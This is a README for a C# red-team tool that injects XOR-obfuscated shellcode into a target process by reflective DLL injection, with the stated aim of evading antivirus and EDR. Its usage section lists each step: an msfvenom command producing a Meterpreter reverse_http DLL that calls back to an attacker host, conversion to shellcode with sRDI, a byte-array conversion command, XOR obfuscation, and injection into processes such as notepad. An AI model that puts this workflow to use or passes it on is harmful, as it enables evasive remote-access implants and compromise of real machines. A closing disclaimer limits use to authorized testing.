# XORed Reflective DLL Injection

This tool written in C# with the purpose to perform Reflective DLL Injection with obfuscated (XOR) shellcode and bypass some Anti-Virus signatures and EDRs.

The tool consists the following projects:

* Xoring - Takes a key and then xoring the shellcode.
* XORedReflectiveDLL - Process Injection Loader for the obfuscated shellcode.

### Usage

	1) Generate DLL using msfvenom. (Feel free to use any tool you want to generate DLL. e.g: cobalt strike or write your custom DLL)
		msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b "\x00" -f dll > reverse_http.dll
	2) Use [sRDI](https://github.com/monoxgas/sRDI) to convert DLL to position independent shellcode.
		python3.6 ConvertToShellcode.py reverse_http.dll
	3) Execute the below command to convert .bin file to a compatible C# byte array format:
		hexdump -v -e '1/1 "0x%02x,"' reverse_http.bin | sed 's/.$//' > reverse_http_bytearray.txt
	4) Copy the byte array shellcode from the reverse_http_bytearray.txt and paste it in the Xoring.cs file at line 29. Make sure to paste it inside the curly brackets.
	5) Change the XOR key at line 26.
	6) Build solution and run the Xoring.exe to obfuscate the shellcode.
	7) Open the file created (It should be similar to: xored_shellcode_*current date*.txt), copy the byte array and paste it in the Reflective.cs file at line 150.
	8) Change the XOR key. (Make sure that the key is the same with the one that you used in Xoring.cs file before.)
	9) Change target process. e.g: notepad, iexplore, etc..etc..
	10) Build the program and run XORedReflectiveDLL.exe

### Credits

Credits goes to [monoxgas](https://github.com/monoxgas/sRDI) for the sDRI tool that convert DLLs to position independent shellcode.\
[Stephen Fewer](https://github.com/stephenfewer/ReflectiveDLLInjection) for the Reflective DLL injection technique.

## Disclaimer:

This project can only be used for authorized testing or educational purposes. Using this software against target systems without prior permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.
